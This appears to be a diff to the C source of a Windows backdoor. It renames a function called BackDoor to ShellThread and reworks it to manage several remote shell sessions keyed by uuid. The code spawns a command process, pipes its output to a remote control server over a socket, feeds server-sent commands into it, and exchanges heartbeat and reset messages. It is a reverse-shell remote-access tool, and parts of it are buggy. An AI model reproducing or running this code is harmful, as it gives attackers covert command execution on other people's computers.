@@ -59,11 +59,13 @@ struct CMSG{
 
 struct CSHELL{
     char *uuid;
-    long live; // 开始时候的时间戳
-    int thread;
+    long time; // 开始时候的时间戳
     char *in_buff;// 用于接收数据
-} *SHELL[];
-
+    BOOL live;//是否存活
+    SOCKET socks;
+};
+struct CSHELL *SHELL = NULL;
+int SHELL_SIZE = 0;
 
 #ifndef _BASE64_H  
 #define _BASE64_H  
@@ -570,8 +572,8 @@ char* getSystemInfomation(char* systeminfo){
 void Clock(void *par){
 
 }
-void BackDoor(SOCKET sock,struct CSHELL *s){
-    
+void ShellThread(int i){
+    // i是数组下标，全局变量SHELL的下标
     
     int ret;
     char Buff[1024]; 
@@ -596,88 +598,46 @@ void BackDoor(SOCKET sock,struct CSHELL *s){
     ret=CreateProcess(NULL,cmdline,NULL,NULL,1,0,NULL,NULL,&si,&ProcessInformation); 
 
     unsigned long lBytesRead; 
-    while (1) 
+    
+    while (SHELL[i].live) 
     { 
-        printf("looping...\n");
         ret=PeekNamedPipe(hReadPipe1,Buff,1024,&lBytesRead,0, 0  ); 
-        if (lBytesRead) 
+        while(lBytesRead) 
         { 
             
             ret=ReadFile(hReadPipe1,Buff,lBytesRead,&lBytesRead,0); 
-            printf("ret: %d read:\n%s\n",ret,Buff);
+            
             if (!ret) {
-                struct CMSG emsg = {
-                    .sign =  "customize",
-                    .mod = SERVER_SHELL_ERROR,
-                    .msg_l = 0
-                    };
-                send(sock,(char*)&emsg,sizeof(struct CMSG),0);
+                break;
             }
             struct CMSG msg = {
                 .sign =  "customize",
                 .mod = SERVER_SHELL_CHANNEL,
-                .msg_l = lBytesRead
+                .l = lBytesRead+strlen(SHELL[i].uuid)+2,
              };
-            printf("SendLen:%d\n,RecvLen:%d\n",strlen(Buff),lBytesRead);
-            send(sock,(char*)&msg,sizeof(struct CMSG),0);
-            ret=send(sock,Buff+'\0',lBytesRead,0);
-            printf("Send:\n%s\nSendEnd\n",Buff);
+            char * s_pck = malloc(lBytesRead+strlen(SHELL[i].uuid)+2);
+            strcat(s_pck,SHELL[i].uuid);
+            strcat(s_pck,"|");
+            strcat(s_pck,Buff);
+            strcat(s_pck,'\0');
+            send(SHELL[i].socks,(char*)&msg,sizeof(struct CMSG),0);
+            ret=send(SHELL[i].socks,s_pck,lBytesRead+strlen(SHELL[i].uuid)+2,0);
             ZeroMemory(Buff,1024);
             if (ret<=0) {struct CMSG emsg = {
                     .sign =  "customize",
                     .mod = SERVER_RESET,
-                    .msg_l = 0
+                    .l = 0
                     };
-                    send(sock,(char*)&emsg,sizeof(struct CMSG),0);
+                    send(SHELL[i].socks,(char*)&emsg,sizeof(struct CMSG),0);
                     break;}; 
-        } else { 
-            char * address = malloc(sizeof(struct CMSG));
-            recv(sock,address,sizeof(struct CMSG),0);
-            struct CMSG msg = *(struct CMSG*)address;
-            free(address);
-            switch (msg.mod){
-                case SERVER_HEARTS:
-                    
-                    continue;
-                case SERVER_SHELL_CHANNEL:{
-                    lBytesRead=recv(sock,Buff,1024,0);
-                    printf("Recv Len:%d Recv:\n%s\nRecvEnd\n",lBytesRead,Buff);
-
-                    if (lBytesRead<=0) {
-                        break;
-                    }//没数据or服务器退出(mod:1) 
-                    Buff[lBytesRead]='\n';
-                    Buff[lBytesRead+1]=0;
-                    printf("[");
-                    int len= strlen(Buff); 
-                    for (int i = 0; i < len; ++i) 
-                    {
-                        printf("%d ", Buff[i]);
-                    }
-                    printf("]\n");
-                    ret=WriteFile(hWritePipe2,Buff,lBytesRead,&lBytesRead,0);
-
-                    ZeroMemory(Buff,1024);
-                    if (!ret) break; 
-                    if (ret<=0)break;
-                    Sleep(600);
-                    continue;
-                }
-                case SERVER_RESET:{
-                    struct CMSG emsg = {
-                    .sign =  "customize",
-                    .mod = SERVER_RESET,
-                    .msg_l = 0
-                    };
-                    send(sock,(char*)&emsg,sizeof(struct CMSG),0);
-                	return;  
-                }
-
-            }
-            
-            // Sleep(600);
+        }
+       
+        if(SHELL[i].in_buff != NULL){
+            ret=WriteFile(hWritePipe2,SHELL[i].in_buff,lBytesRead,&lBytesRead,0);
+            SHELL[i].in_buff = NULL;
         }
     }
+    free(SHELL[i]);
     return;
 }
 void Hearts(void *sock){
@@ -714,6 +674,7 @@ void Handle(){
     unsigned char decrypt[16]; 
     WSAStartup(MAKEWORD(2,2),&WSAData); 
     HOSTENT* pHS = gethostbyname(D);
+    time_t t;
     int s;
     if(pHS!=NULL){
     struct in_addr addr;
@@ -807,16 +768,31 @@ void Handle(){
                 printf("uuid:%s\n", uuid);
                 char * cmd = strtok(NULL, "|");
                 printf("cmd:%s\n", cmd);
-                for(int i=0;i<=len(SHELL);i++){
-                    if (strcmp(SHELL[i].uuid,uuid)){
-                        time_t t;
+                for(int i=0;i<=SHELL_SIZE;i++){
+                    if (strcmp(((struct CSHELL *)SHELL[i])->uuid,uuid)){
+                        //收到cmd命令，重置定时器并且把数据丢到chan里面
+                        
 	                    t = time(NULL);
-                        SHELL[i].in_buff = cmd;
-                        SHELL[i].live = time(&t);
+                        SHELL[i]->in_buff = cmd;
+                        SHELL[i]->live = time(&t);
                         goto end;
                     }
                 }
-                // __beginthread
+                // 不存在线程，新建一个
+                struct CSHELL S = {
+                    .uuid = uuid,
+                    .time = time(NULL),
+                    .in_buff = cmd,
+                    .live = TRUE,
+                    .socks = sock,
+                };
+                
+                for(int i=0;i<=SHELL_SIZE;i++){
+                    if(SHELL[i]==NULL){
+
+                    }
+                }
+                _beginthread(Hearts,0,(void *)sock);
                 end:
                 free(cmd_shell);
                 continue;
